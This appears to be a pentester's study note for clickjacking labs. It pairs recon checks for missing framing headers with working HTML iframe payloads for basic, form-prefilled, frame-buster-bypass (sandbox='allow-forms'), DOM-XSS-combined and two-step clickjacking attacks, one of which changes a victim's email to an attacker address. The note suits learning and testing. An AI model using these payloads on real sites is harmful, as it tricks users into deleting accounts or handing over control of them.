![[Clickjacking.svg]]
# Recon

Identify if the app's responses contain the following headers:

- X-Frame-Options: value
- Content-Security-Policy: frame-ancestors value

If the responses do not contain these headers, then the app is most likely vulnerable to clickjacking.
# Basic Clickjacking

Use a basic clickjacking payload that loads the vulnerable application's page in an \<iframe> which contains a button to delete the user's account. You can use the method to trick a user into clicking on the "Delete account" button on the targeted application.

For example: height: 700px, weight: 500px, opacity: 0.1, top: 500px, left: 100px

>[!info]
>For the labs, the "Test me" text needs to be changed to "Click me".

```html
<style>
    iframe {
        position:relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 495px;
        left: 70px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="$VULNERABLE-APPLICATION-URL"></iframe>
```
# Clickjacking - Prepopulate POST Form with Query Parameters

It may be possible to prepopulate a form used in a POST request, by referencing those body parameters as query parameters in a GET request. Use a clickjacking payload, which will prepopulate a \<form> parameter's values, by using query parameters in a GET request.

Include this targeted web page in an \<iframe>. Since the form will be prepopulated, you only need to induce the user into clicking on the button that will submit the POST request. For example:

```css
height: 700px , weight: 500px , opacity: 0.1 , top: 500px , left: 100px
```

```html
<style>
    iframe {
        position:relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 440px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="$VULNERABLE-APPLICATION-URL?email=hacker@attacker-website.com"></iframe>
```
# Prepopulate Form + Frame Buster Script Bypass

It may be possible to prepopulate a form used in a POST request by referencing those body parameters as query parameters in a GET request. Use a clickjacking payload which will prepopulate a \<form> parameter's value, using a query parameter in a GET request.

Include this targeted web page in an \<iframe> with the attribute 'sandbox="allow-forms"', which will neutralize the frame buster script. Since the form will be prepopulated, you only need to induce the user into clicking on the button that will submit the POST request.

For example:

```css
height: 700px , weight: 500px , opacity: 0.1 , top: 500px , left: 100px
```

```html
<style>
    iframe {
        position:relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 450px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms"
src="$VULNERABLE-APPLICATION-URL?email=hacker@attacker-website.com"></iframe>
```
# Prepopulate Form + DOM XSS Exploit

It may be possible to prepopulate a form used in a POST request by referencing those body parameters as query parameters in a GET request. Use a clickjacking payload which will prepopulate a \<form> parameter's value, using query parameters in a GET request.

One of these parameters will include an XSS payload, as a client-side script on the app is using the parameter's value in a dangerous Sink (innerHTML). Combining both clickjacking and XSS leads to a higher impact. Without the clickjacking vulnerability, the XSS would be more difficult to pull off since the form requires a CSRF token.

Include this targeted web page in an \<iframe>. Since the form will be prepopulated, you only need to induce the user into clicking on the button that will submit the POST request.

For example:

```css
height: 700px , weight: 500px , opacity: 0.1 , top: 500px , left: 100px
```

```html
<style>
	iframe {
		position:relative;
		width: 500px;
		height: 700px;
		opacity: 0.1;
		z-index: 2;
	}
	div {
		position:absolute;
		top: 610px;
		left: 80px;
		z-index: 1;
	}
</style>
<div>Click me</div>
<iframe
src="$VULNERABLE-APPLICATION-URL?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```
# 2-Step Clickjacking Attack

Use a basic clickjacking attack that loads the vulnerable app's page in an \<iframe> which contains a button to delete the user's account. You can use this method to trick a user into clicking on the "Delete account" button, then confirm the action by clicking on another button on the targeted app.

For example:

```css
height: 700px , weight: 500px , opacity: 0.1 , top: 500px , left: 100px
```

```html
<style>
	iframe {
		position:relative;
		width: 500px;
		height: 700px;
		opacity: 0.1;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top: 500px;
		left: 50px;
		z-index: 1;
	}
   .secondClick {
		top: 290px;
		left: 225px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="$VULNERABLE-APPLICATION-URL"></iframe>
```